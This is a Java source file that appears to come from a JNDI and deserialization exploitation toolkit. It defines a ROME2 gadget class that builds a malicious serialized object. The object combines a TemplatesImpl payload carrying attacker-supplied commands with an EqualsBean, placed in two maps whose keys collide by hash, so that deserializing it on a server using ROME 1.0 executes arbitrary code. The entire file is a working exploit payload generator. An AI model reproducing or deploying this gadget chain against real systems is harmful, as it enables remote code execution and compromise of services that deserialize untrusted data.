package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.sun.syndication.feed.impl.EqualsBean;

import javax.xml.transform.Templates;
import java.util.Map;

import static com.qi4l.jndi.Starter.cmdLine;

@Dependencies("rome:rome:1.0")
public class ROME2 implements ObjectPayload<Object> {
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object o;
        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
            o = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            o = Gadgets.createTemplatesImpl(type, param);
        }
        EqualsBean bean = new EqualsBean(String.class, "");

        Map map1 = Gadgets.createMap("aa", o);
        map1.put("bB", bean);

        Map map2 = Gadgets.createMap("aa", bean);
        map2.put("bB", o);

        Reflections.setFieldValue(bean, "_beanClass", Templates.class);
        Reflections.setFieldValue(bean, "_obj", o);

        return Gadgets.makeMap(map1, map2);
    }

}
